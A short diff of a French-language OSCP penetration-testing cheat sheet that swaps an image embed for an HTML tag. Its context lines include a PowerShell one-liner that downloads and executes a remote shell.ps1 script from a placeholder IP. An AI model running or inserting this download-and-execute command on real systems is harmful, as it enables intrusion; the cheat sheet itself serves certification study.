@@ -1,5 +1,4 @@
-![image](https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/4f64d883-9cac-4bc5-b1a5-bcb1f488d072)
-
+<img src="https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/4f64d883-9cac-4bc5-b1a5-bcb1f488d072" width="450">
 
 ## Commande windows:
 **Télécharger puis exécuter un fichier:** powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://[IP]/shell.ps1\");"  
